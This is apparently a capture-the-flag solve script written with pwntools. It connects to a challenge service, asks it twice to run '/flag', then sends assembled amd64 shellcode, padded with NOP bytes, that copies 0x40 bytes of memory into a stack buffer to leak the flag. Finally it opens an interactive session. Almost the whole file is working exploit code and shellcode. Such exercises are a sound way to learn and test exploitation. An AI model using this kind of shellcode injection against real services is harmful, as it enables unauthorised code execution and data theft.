from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337


def run_code(r, code):
    r.sendline("1")
    r.sendlineafter("> ", "/dev/stdin")
    r.send(code)
    r.recvuntil(": ")


def run_file(r, file):
    r.sendline("1")
    r.sendlineafter("> ", file)
    r.recvuntil(": ")


FLAG = b""


def solve():
    r = remote(HOST, int(PORT))
    # r = process("./challenge")

    r.recvuntil(b": ")
    run_file(r, "/flag")
    run_file(r, "/flag")

    SC = """    
        lea rbx, qword ptr [rip]
        sub rbx, 7
        mov rcx, rbx
        sub rcx, 0x2000
        mov rdx, qword ptr [rbp - 0x28]
        add rdx, 0xc

        mov rdi, 0
        loop:
        mov al, byte ptr [rcx + rdi]
        mov byte ptr [rdx + rdi], al
        add rdi, 1
        cmp rdi, 0x40
        jl loop

        ret
        """

    context.arch = "amd64"

    code = asm(SC)
    code = code.ljust(0x30, b"\x90")
    run_code(r, code)

    r.sendline("2")
    r.interactive()

solve()